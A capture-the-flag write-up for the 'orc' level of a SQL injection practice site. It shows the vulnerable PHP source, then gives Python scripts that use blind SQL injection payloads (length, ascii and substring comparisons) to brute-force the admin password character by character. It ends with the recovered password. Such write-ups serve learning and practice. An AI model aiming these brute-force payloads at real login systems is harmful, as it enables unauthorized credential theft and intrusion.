Source:

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

In this challenge, we would have a general overview of **Blind SQL Injection**.
Tutorial: [Blind SQLi](https://portswigger.net/web-security/sql-injection/blind)

The program above's divided into 2 main section:
- The first one is a basic SQLi and easy to pass
- The second is what we have to solve. 
We should rely on the first part to guess the password to complete the chall.

We try guess the payload to see whether it is accomplished or not (if SQLi in the first query "kick in" successful, "Hello admin" will be printed on the screen).

Try guess the length, insert **length(pw)** function (try **len()** but not working, so it maybe MySQL ), then comment out all the remaining code: `try_payload ="pw=123' or length(pw) < 10 -- char(32)"`.

The page return "Hello admin", so the length of password is less than 10 characters.

So we ought to guess the exact length of password with similar query and try from range 1 to 9, append the query into url and loop it. This python code below will solve this:
```python
from requests import *
# try_payload ="pw=123' or length(pw) < 10 -- char(32)"
cookie = dict(PHPSESSID="sftmn1nhpsjgke59r39nfn03nv")

for i in range (10):
    payload = "?pw=123' or length(pw) = " + str(i) + " -- char(32)"
    a = get("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php" + payload, cookies=cookie)
    if "Hello admin" in a.text:
        print(payload)
        print("The length of password is", i)
```

Note: 
- This page require login method, so make sure we have cookie to maintain our access and get into the chall. 
- Get cookie by Developer Mode -> Storage(Firefox)/ Application(Edge, Chrome, ...).

Result:

![image](https://user-images.githubusercontent.com/48288606/154279600-86f8f63e-8def-4c8a-942c-4409eb4826fd.png)

With the shown result, we will guess which character is stayed in each position. We can take advantages of **ascii()** and **substring()** function to make a comparison the password with the character we test. We try all the printable character in ascii code (from 32-> 126). Use this pattern to brute-force all the case of available password: `?pw=123' or ascii(substring(pw, {position}, 1)) = {ascii_number} -- char(32)`

The possibility of the chall is contingent on the complex of the password so this chall still be reasonable. The code below will brute-force the password we need.


```python
from requests import *
try_payload ="pw=123' or length(pw) < 10 -- char(32)"
cookie = dict(PHPSESSID="sftmn1nhpsjgke59r39nfn03nv")


adminPassword = ""

print("==============================================================")

for i in range (1,9):
    for j in range(32, 127):
        payload = "?pw=123' or ascii(substring(pw, " + str(i) + ", 1)) = '" + str(j) + "' -- char(32)"
        a = get("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php" + payload, cookies=cookie)
        if "Hello admin" in a.text:
            print(payload)
            print("The position of ", i, "has value: ", chr(j))
            print("==============================================================")
            adminPassword += chr(j)
            break

print("Password of Administrator: ", adminPassword)
```
We get the full password for admin login:

![image](https://user-images.githubusercontent.com/48288606/154270130-49cda9fc-b71b-4e77-a935-bdf748949920.png)


Filter(pw): `prob` | `_` | `.` | `()`

PW: `095a9852` 

Payload: `?pw=095a9852`

Code solve: [HERE](3-orc.py)
